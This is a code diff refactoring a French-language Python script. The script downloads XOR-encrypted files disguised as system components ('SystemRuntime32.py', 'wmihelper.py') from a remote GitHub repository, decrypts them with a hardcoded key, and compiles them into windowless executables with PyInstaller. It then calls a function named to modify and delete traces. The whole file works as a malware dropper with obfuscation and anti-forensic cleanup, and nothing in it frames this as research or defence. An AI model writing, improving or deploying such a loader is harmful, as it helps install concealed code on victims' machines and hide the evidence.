@@ -4,67 +4,64 @@ import requests
 import subprocess
 import sys
 
-# === Clé de décryptage ===
+# Clé de déchiffrement
 CLE = "LUCORACORE987"
 
-# === URLs des fichiers à télécharger ===
+# URLs des fichiers cryptés
 URLS = {
-    "SystemRuntime32.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
-    "wmihelper.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc"
+    "SystemRuntime32.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
+    "wmihelper.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc",
 }
 
-# === Dossier de sortie pour les .exe ===
-DOSSIER_SORTIE = r"C:\Users\LOUKITA\Desktop\Test23"
+# Dossier de sortie des .exe
+DIST_PATH = r"C:\Users\LOUKITA\Desktop\Test23"
 
+def decrypt(content: bytes, key: str) -> str:
+    key_bytes = key.encode()
+    key_len = len(key_bytes)
+    decrypted = bytearray()
+    for i, b in enumerate(content):
+        decrypted.append(b ^ key_bytes[i % key_len])
+    return decrypted.decode(errors='ignore')
 
-def verifier_et_installer_pyinstaller():
+def download_and_decrypt(url, key):
+    print(f"[i] Téléchargement de {url} ...")
+    r = requests.get(url, timeout=15)
+    r.raise_for_status()
+    decrypted_text = decrypt(r.content, key)
+    return decrypted_text
+
+def save_script(path, content):
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(content)
+    print(f"[✓] Script sauvegardé : {path}")
+
+def ensure_pyinstaller():
     try:
         import PyInstaller
+        print("[i] PyInstaller déjà installé.")
     except ImportError:
-        print("[...] PyInstaller non trouvé. Installation...")
+        print("[i] PyInstaller non trouvé. Installation en cours...")
         subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
         print("[✓] PyInstaller installé.")
 
-
-def decrypt(texte, cle):
-    cle_repetee = (cle * ((len(texte) // len(cle)) + 1))[:len(texte)]
-    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(texte, cle_repetee))
-
-
-def telecharger_et_decrypter(nom, url, cle):
-    chemin_temp = os.path.join(tempfile.gettempdir(), nom)
-    try:
-        print(f"[↓] Téléchargement de {url}")
-        r = requests.get(url, timeout=10)
-        r.raise_for_status()
-
-        contenu_crypte = r.content.decode("utf-8", errors="ignore")
-        contenu_decrypte = decrypt(contenu_crypte, cle)
-
-        with open(chemin_temp, "w", encoding="utf-8") as f:
-            f.write(contenu_decrypte)
-        print(f"[✓] Déchiffré et enregistré dans : {chemin_temp}")
-        return chemin_temp
-    except Exception as e:
-        print(f"[!] Erreur avec {nom} : {e}")
-        return None
-
-
-def compiler_en_exe(source_path, dossier_sortie):
-    nom_fichier = os.path.basename(source_path).replace(".py", "")
-    try:
-        subprocess.run([
-            "pyinstaller",
-            "--noconfirm",
-            "--onefile",
-            "--windowed",  # Pas de fenêtre
-            "--distpath", dossier_sortie,
-            source_path
-        ], check=True)
-        print(f"[✓] Compilé en .exe : {nom_fichier}.exe")
-    except Exception as e:
-        print(f"[!] Erreur compilation : {e}")
-
+def compile_script(py_path, dist_path):
+    print(f"[i] Compilation de {py_path} ...")
+    cmd = [
+        sys.executable, "-m", "PyInstaller",
+        "--noconfirm",
+        "--onefile",
+        "--windowed",
+        "--distpath", dist_path,
+        py_path
+    ]
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    if result.returncode != 0:
+        print("[!] Erreur compilation :")
+        print(result.stderr)
+        raise RuntimeError(f"PyInstaller a échoué sur {py_path}")
+    else:
+        print(f"[✓] Compilation réussie : {os.path.join(dist_path, os.path.splitext(os.path.basename(py_path))[0] + '.exe')}")
 
 def modifier_et_supprimer_trace():
     temp_dir = tempfile.gettempdir()
@@ -106,23 +103,23 @@ def modifier_et_supprimer_trace():
     except Exception as e:
         print(f"[!] Erreur lors de la suppression : {e}")
 
-
 def main():
-    os.makedirs(DOSSIER_SORTIE, exist_ok=True)
+    temp_dir = tempfile.gettempdir()
+    ensure_pyinstaller()
 
-    verifier_et_installer_pyinstaller()
+    # Téléchargement, décryptage, sauvegarde et compilation des fichiers
+    for filename_enc, url in URLS.items():
+        try:
+            content = download_and_decrypt(url, CLE)
+            py_filename = filename_enc[:-4]  # enlever '.enc'
+            py_path = os.path.join(temp_dir, py_filename)
+            save_script(py_path, content)
+            compile_script(py_path, DIST_PATH)
+        except Exception as e:
+            print(f"[!] Erreur sur {filename_enc} : {e}")
 
-    fichiers_decryptes = []
-    for nom, url in URLS.items():
-        chemin = telecharger_et_decrypter(nom, url, CLE)
-        if chemin:
-            fichiers_decryptes.append(chemin)
-
-    for fichier in fichiers_decryptes:
-        compiler_en_exe(fichier, DOSSIER_SORTIE)
-
+    # Lance ta fonction de modification et suppression du trace
     modifier_et_supprimer_trace()
-
 
 if __name__ == "__main__":
     main()
